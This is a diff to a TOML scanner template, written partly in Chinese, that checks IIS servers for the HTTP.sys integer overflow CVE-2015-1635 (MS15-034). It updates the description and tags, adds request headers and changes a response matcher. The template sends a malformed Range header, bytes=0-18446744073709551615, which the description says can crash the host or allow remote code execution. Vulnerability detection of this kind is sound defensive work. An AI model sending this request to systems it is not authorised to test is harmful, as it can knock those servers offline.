@@ -1,10 +1,16 @@
 [info]
 author = "ave"
-description = "通过发送包含畸形 Range 头的 HTTP 请求检测目标服务器是否存在 MS15-034 漏洞。若服务器返回 416 状态码且响应体包含 'Requested Range Not Satisfiable'、响应头包含 'Microsoft'，则判定存在漏洞。"
+description = "通过向目标 IIS 服务器发送携带畸形 Range 头（bytes=0-18446744073709551615）的 HTTP 请求，检测 Windows HTTP.sys 是否存在整数溢出漏洞。若服务器返回 HTTP 416 状态码及 'Requested Range Not Satisfiable' 响应体，则判定目标存在 CVE-2015-1635 漏洞。该漏洞可导致拒绝服务（蓝屏）或远程代码执行。"
 id = "POC-AVE-2015-0022"
-name = "Microsoft Windows HTTP.sys 远程代码执行漏洞 PoC"
+name = "CVE-2015-1635 Microsoft HTTP.sys 远程代码执行漏洞 PoC"
 severity = "critical"
-tags = ["ave-2015-0022"]
+tags = [
+    "cve-2015-1635",
+    "ms15-034",
+    "http.sys",
+    "iis",
+    "rce",
+]
 vuln_id = [
     "CVE-2015-1635",
     "AVE-2015-0022",
@@ -19,7 +25,9 @@ path = "/{{BaseURL}}/"
 protocol = "http"
 
 [poc.requests.headers]
+Host = "{{Hostname}}"
 Range = "bytes=0-18446744073709551615"
+Referer = "{{BaseURL}}"
 
 [[poc.requests.matchers]]
 expect = true
@@ -33,7 +41,7 @@ part = "body"
 type = "word"
 words = [
     "Requested Range Not Satisfiable",
-    "请求范围不符合",
+    "HTTP Error 416",
 ]
 
 [[poc.requests.matchers]]
